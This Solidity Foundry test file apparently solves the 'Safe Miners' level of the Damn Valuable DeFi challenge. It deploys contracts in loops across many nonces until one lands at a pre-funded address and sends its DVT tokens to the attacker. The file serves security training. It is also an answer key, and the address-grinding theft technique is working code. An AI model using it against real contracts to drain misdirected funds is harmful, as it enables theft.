// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";

contract AttackSafeMiners {
    constructor(address _dvt, uint256 nonces) {
        for (uint256 idx; idx < nonces;) {
            new TokenWithdraw(_dvt);
            unchecked {
                ++idx;
            }
        }
    }
}

contract TokenWithdraw {
    constructor(address _dvt) {
        DamnValuableToken dvt = DamnValuableToken(_dvt);
        uint256 bal = dvt.balanceOf(address(this));
        if (bal != 0) {
            console.log("Succeed");
            dvt.transfer(tx.origin, bal);
        }
    }
}

contract SafeMiners is Test {
    uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
    address internal constant DEPOSIT_ADDRESS = 0x79658d35aB5c38B6b988C23D02e0410A380B8D5c;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        // Deploy Damn Valuable Token contract
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deposit the DVT tokens to the address
        dvt.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertEq(dvt.balanceOf(attacker), 0);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        for (uint256 n; n < 100;) {
            new AttackSafeMiners(address(dvt), 100);
            unchecked {
                ++n;
            }
        }

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        // The attacker took all tokens available in the deposit address
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(dvt.balanceOf(attacker), DEPOSIT_TOKEN_AMOUNT);
    }
}
